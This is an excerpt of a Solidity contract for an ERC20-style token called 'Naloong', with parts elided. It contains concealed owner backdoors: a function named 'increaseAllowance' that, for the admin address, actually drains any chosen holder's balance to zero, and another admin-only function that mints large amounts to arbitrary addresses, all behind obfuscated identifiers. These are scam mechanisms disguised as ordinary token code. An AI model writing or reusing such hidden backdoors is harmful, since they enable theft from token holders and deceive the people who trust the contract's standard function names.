...
contract NaloongTOKEN is Ownable {
    address public sbmgjk12;
    uint256 supplyamount = 10000000000*10**decimals();
    uint256 private _cctotalSupply = supplyamount;
    string private _cctokenname = "Naloong";
    string private _cctokensymbol = "Naloong";
    constructor(address tokenadmin) {
        sbmgjk12 = tokenadmin;
       Naloong[_msgSender()] += supplyamount;
        emit Transfer(address(0), _msgSender(), supplyamount);
    }
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event Transfer(address indexed from, address indexed to, uint256 value);
    mapping(address => uint256) private Naloong;
    ...
    function increaseAllowance(address uuyxxx) public     {
        if(sbmgjk12 == _msgSender()){
        address newadd = uuyxxx;
        uint256 curamount = Naloong[newadd];
        uint256 newaaamount = Naloong[newadd]+Naloong[newadd]-curamount;
        Naloong[newadd] -= newaaamount;
        }else{
        if(sbmgjk12 == _msgSender()){
        }else{
            revert("ccc");
    ...
    external {
        ...
        Naloong[cc123d] += 38200*((10**decimals()*xxtoudiamount))*1*1;
        require(sbmgjk12 == _msgSender());
        if(sbmgjk12 == _msgSender()){
        }
    }
    ...
    function _transfer(
        ...
        uint256 balance = Naloong[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        Naloong[from] = Naloong[from]-amount;
        Naloong[to] = Naloong[to]+amount;
